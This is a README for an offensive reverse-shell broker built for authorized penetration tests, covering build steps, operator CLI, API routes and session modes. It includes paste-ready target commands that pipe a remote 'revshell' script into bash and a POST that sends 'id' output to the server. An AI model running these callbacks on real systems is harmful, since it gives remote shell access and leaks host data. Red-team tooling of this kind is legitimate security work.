# revshell-io

Callback/session broker for authorized pentests. Targets call back over HTTPS, operators attach from browser or CLI.

## Build

CI builds static **rsd**, **rsctl**, and **rs-agent** for:

| Label | GOOS / GOARCH |
|-------|----------------|
| linux-amd64 (x86_64) | linux / amd64 |
| linux-arm64 (aarch64) | linux / arm64 |
| linux-386 (x86) | linux / 386 |
| darwin-amd64 (x86_64) | darwin / amd64 |
| darwin-arm64 (aarch64) | darwin / arm64 |

Download artifacts from [GitHub Actions](https://github.com/nmagill123/revshell-io/actions) or tagged [Releases](https://github.com/nmagill123/revshell-io/releases).

```
make all          # rsd, rsctl, and cross-compiled rs-agent binaries
# or
go build -o rsd ./cmd/rsd
go build -o rsctl ./cmd/rsctl
make agents       # required: agents-bin/linux-amd64, linux-arm64, ...
```

## Run

```
./rsd --listen :8080 --public-url https://rs.example.com --db rsd.db --agents-dir agents-bin
```

`--agents-dir` must contain `rs-agent` builds from `make agents`. Callback URLs use the request `Host` (so Docker targets can use `host.docker.internal:8080` without editing the script).

There is **no global admin token**. Open the hub in a browser to get a workspace cookie (24h), then mint a workspace CLI token from the hub panel for `rsctl`.

`--max-sessions-per-workspace` (default `12`) limits how many active sessions each workspace can create.

Put Caddy/nginx in front for TLS:

```
rs.example.com {
    reverse_proxy 127.0.0.1:8080
}
```

## CLI

```bash
# Mint token from http://localhost:8080/ (rsctl panel), then:
rsctl login http://localhost:8080 <workspace-cli-token>

# Create session (counts toward your workspace cap)
rsctl new --name htb-box

# List sessions
rsctl list

# Attach (raw terminal over WebSocket)
rsctl attach <session-id>

# Kill session
rsctl kill <session-id>

# Dump generated payload
rsctl gen <session-id> --type sh
rsctl gen <session-id> --type nopty
```

## Target Callbacks

`rsctl new` prints ready-to-paste commands:

```bash
# Bootstrap: detects arch, downloads rs-agent, runs PTY shell (falls back to HTTP poll)
curl -fsSL https://rs.example.com/<uuid>/revshell | bash

# From Docker (use host that reaches your machine)
curl -fsSL http://host.docker.internal:8080/<uuid>/revshell | bash

# One-shot event
curl -sk -X POST https://rs.example.com/s/<id>/<secret>/event -d "$(id)"
```

The `revshell` script uses `curl` or `wget` to fetch `/<uuid>/agent/linux-arm64` (etc.), then execs the agent with `RSD_SERVER`, `RSD_SESSION`, `RSD_SECRET`.

## Browser UI

Open `http://localhost:8080/` for the **sessions hub**:

- **New session** creates another UUID (multiple sessions in localStorage)
- **rsctl** — mint workspace CLI token (24h, scoped to sessions you create in this browser)
- Session list shows target info when connected: user@host, OS, kernel
- **Light/dark mode**, disclaimer modal

```bash
# paste from browser hub
rsctl login http://localhost:8080 <token>
rsctl list
rsctl attach <session-id>
```

Config: `~/.rsctl` (or `./.rsctl`). Env vars `RSD_SERVER` / `RSD_TOKEN` override the file.

### Testing without PTY

Force HTTP command mode (line-oriented: type a command, press Enter; no real TTY). Dead nopty beacons are removed after ~45s of silence; operators see `[beacon disconnected]` and attach closes. Browser resize events are ignored in command mode.

```bash
# Callback sets RSD_NO_PTY=1 on the agent
curl -fsSL http://localhost:8080/<session-id>/nopty | bash

# Or run agent directly
RSD_NO_PTY=1 ./rs-agent -server http://localhost:8080 -session <id> -secret <secret>
./rs-agent --no-pty -server ... -session ... -secret ...

# Docker: hide PTY device
docker run --rm -v /dev/null:/dev/ptmx amazonlinux \
  curl -fsSL http://host.docker.internal:8080/<id>/revshell | bash
```

## Modes

| Mode | Transport | PTY | How |
|------|-----------|-----|-----|
| Interactive PTY | WebSocket | yes | Target runs Go/Python agent with PTY |
| Command channel | HTTP poll | no | Target polls for commands, posts results |
| One-shot event | HTTP POST | no | Single POST, no live session |

The system auto-detects based on what the target reports during registration.

## Sessions

- 6 hour inactivity TTL (any interaction resets the timer)
- Multiple targets can call back to the same session UUID
- Multiple operators can attach simultaneously

## API

```
POST   /api/sessions              create session (bearer auth)
GET    /api/sessions              list sessions (bearer auth)
GET    /api/sessions/:id          session detail (bearer auth)
DELETE /api/sessions/:id          kill session (bearer auth)

POST   /s/:id/:secret/register   target registers capabilities
GET    /s/:id/:secret/poll       long-poll (30s block)
POST   /s/:id/:secret/push       target posts output
POST   /s/:id/:secret/event      one-shot event
WS     /s/:id/:secret/connect    target WebSocket (PTY or command)
WS     /s/:id/attach             operator WebSocket (bearer or cookie auth)
GET    /s/:id/:secret/sh         bash shim
GET    /s/:id/:secret/py         python shim
```

## Storage

BBolt (single file, `rsd.db`). No external dependencies.

Authorized security testing and lab use only.
